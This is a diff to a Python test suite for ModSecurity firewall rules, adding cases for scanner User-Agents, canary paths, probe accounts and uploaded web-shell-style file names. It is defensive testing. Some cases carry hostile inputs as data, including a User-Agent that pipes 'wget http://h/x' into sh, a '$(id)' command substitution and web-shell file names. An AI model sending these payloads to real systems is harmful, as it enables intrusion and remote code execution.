@@ -89,10 +89,19 @@ TIER_CASES = [
     ("001 a product whose name contains the letters is served", dict(ua="SmartExchange/2.1"), 200),
     ("002 web-shell manager", dict(ua="Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0)"), 403),
     ("a scripted client is not blocked for being scripted", dict(ua="python-urllib/3.12"), 200),
+    ("001 ReconProbe is logged, not denied (low confidence, hunt only)", dict(ua="ReconProbe/1.0"), 200),
+    ("003 a self-declared tester string is logged, not denied", dict(ua="Mozilla/5.0 (research; read-only; pentest)"), 200),
     ("004 canary path", dict(path="/zzz-nonexistent-xyz123"), 403),
     ("004 canary path, upper case", dict(path="/ZZZ-Nonexistent"), 403),
     ("004 canary path, encoded", dict(path="/zzz%2dnonexistent"), 403),
     ("004 artex-probe file", dict(path="/uploads/artex-probe-10422.txt"), 403),
+    ("004 canary path with an underscore", dict(path="/zzz_nonexistent_abc.txt"), 403),
+    ("004 the canary word with another separator is served", dict(path="/zzz.nonexistent"), 404),
+    ("004 SSRF canary path with an intent counter", dict(path="/_i6084_probe_missing"), 403),
+    ("004 SSRF canary path in a parameter", dict(path="/cb?u=http://h/_i49_probe_missing"), 403),
+    ("004 a probe_missing path with no intent counter is served", dict(path="/status/liveness_probe_missing"), 404),
+    ("004 a one-digit counter is not the canary", dict(path="/_i6_probe_missing"), 404),
+    ("004 a developer placeholder id is served (hunt, not deny)", dict(path="/api/objects/deadbeefdeadbeefdeadbeef12"), 404),
     ("004 canary user in the query", dict(path="/login?user=zz_no_such_user_9f3a"), 403),
     ("004 canary user in a form body", form("/login", "username=zzq.nonexistent9x7&password=x"), 403),
     ("004 encoded canary in a form body", form("/login", "email=precheck.not-a-user%40example.invalid"), 403),
@@ -113,15 +122,23 @@ TIER_CASES = [
     ("006 the word in prose is served", dict(path="/search?q=the%20artex's%20manual"), 404),
     ("007 probe account", form("/login", "email=i04probe1792451568%40x.com"), 403),
     ("007 an ordinary address is served", form("/login", "email=probe%40x.com"), 200),
+    ("007 probe account, six-digit intent counter", form("/login", "email=i808807probe1792451568%40x.com"), 403),
+    ("007 a pentest-probe sign-up with no counter is left to the hunts", form("/login", "email=pentestprobeq7m4z2%40x.com"), 200),
     ("008 task artifact", dict(path="/up/i4028.asp"), 403),
     ("008 task artifact, encoded extension", dict(path="/up/i4028.%70hp"), 403),
     ("008 task artifact with a path parameter", dict(path="/up/i4028.php;.jpg"), 403),
     ("008 task artifact with path info", dict(path="/up/i4028.php/x"), 403),
     ("008 index.php is served", dict(path="/index.php"), 404),
+    ("008 task artifact, six-digit intent counter", dict(path="/up/i808807.jsp"), 403),
+    ("008 task artifact, seven-digit intent counter", dict(path="/up/i1234567.php"), 403),
+    ("008 a two-digit name is served", dict(path="/i18.php"), 404),
+    ("008 an eight-digit name is served", dict(path="/i12345678.php"), 404),
     ("008 log-poisoning shell name", dict(path="/x/cl1217.jsp"), 403),
     ("008 log-poisoning shell name with a path parameter", dict(path="/x/cl1217.jsp;x=1"), 403),
     ("008 an ordinary jsp is served", dict(path="/page2024.jsp"), 404),
     ("008 uploaded task artifact", upload("i4028.php"), 403),
+    ("008 uploaded task artifact, six-digit counter", upload("i808807.aspx"), 403),
+    ("008 an uploaded two-digit name is served", upload("i18.php"), 200),
     ("009 plain XML is served", post("<a>1</a>", "application/xml"), 200),
     ("011 command substitution in the User-Agent", dict(ua="x $(id)"), 403),
     ("011 download piped to a shell in the User-Agent", dict(ua="a; wget http://h/x | sh"), 403),
@@ -173,7 +190,24 @@ SERVER_NORMALIZED = [
 LOG_ONLY_CASES = [
     ("003 ffuf is logged, not blocked", dict(ua="Fuzz Faster U Fool v2.1.0-dev"), "9907003"),
     ("003 norma is logged, not blocked", dict(ua="norma/0.4"), "9907003"),
+    ("003 norma at another version is logged", dict(ua="norma/1.2"), "9907203"),
+    ("003 ReconProbe is logged, not blocked", dict(ua="ReconProbe/1.0"), "9907003"),
+    ("003 pentest-probe (Bitrise)", dict(ua="pentest-probe-i5938/1.0"), "9907003"),
+    ("003 authorized-pentest (Bitrise)", dict(ua="Mozilla/5.0 (compatible; authorized-pentest/bitrise-readonly)"), "9907003"),
+    ("003 authorized-security-research (Bitrise)", dict(ua="Mozilla/5.0 (compatible; authorized-security-research)"), "9907003"),
+    ("003 research-readonly (Bitrise)", dict(ua="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) research-readonly"), "9907003"),
+    ("003 research; read-only (Bitrise)", dict(ua="Mozilla/5.0 (research; read-only; pentest)"), "9907003"),
+    ("003 read-only-audit (Barracuda)", dict(ua="Mozilla/5.0 (compatible; read-only-audit)"), "9907003"),
     ("013 isCliRequest is logged, not blocked", dict(headers={"isCliRequest": "true"}), "9907013"),
+]
+
+# The other half of a log-only rule: a request it must NOT log. Absence cannot be waited for,
+# so each is followed on the same connection by a request that logs 9907013; once that line is
+# in the log, the request before it has finished logging too.
+NOT_LOGGED_CASES = [
+    ("003 norma later in the header is not the anchored match", dict(ua="Mozilla/5.0 abnorma/1.2"), "9907203"),
+    ("003 a read-only kiosk is not a tester string", dict(ua="Mozilla/5.0 (Linux; read-only kiosk)"), "9907003"),
+    ("003 a pentest product name is not a tester string", dict(ua="pentest-tools-dashboard/2.0"), "9907003"),
 ]
 
 
@@ -583,6 +617,17 @@ class _ModSecurityCases:
                 since = len(engine.log())
                 self.assertEqual(engine.request(src="127.7.8.%d" % (index + 1), **request), 200)
                 self.assertTrue(self.logged(engine, rule_id, since), rule_id)
+
+    def test_log_only_rules_stay_quiet_on_near_misses(self):
+        engine = self.engines["main"]
+        for index, (name, request, rule_id) in enumerate(NOT_LOGGED_CASES):
+            with self.subTest(name):
+                src = "127.7.9.%d" % (index + 1)
+                since = len(engine.log())
+                self.assertEqual(engine.request(src=src, **request), 200)
+                self.assertEqual(engine.request(src=src, headers={"isCliRequest": "true"}), 200)
+                self.assertTrue(self.logged(engine, "9907013", since), "the marker request was not logged")
+                self.assertNotIn('id "%s"' % rule_id, engine.log()[since:])
 
     def test_artex_named_in_the_user_agent(self):
         # Every user-agent in F5 Labs' appendix that carries the framework's name is refused.
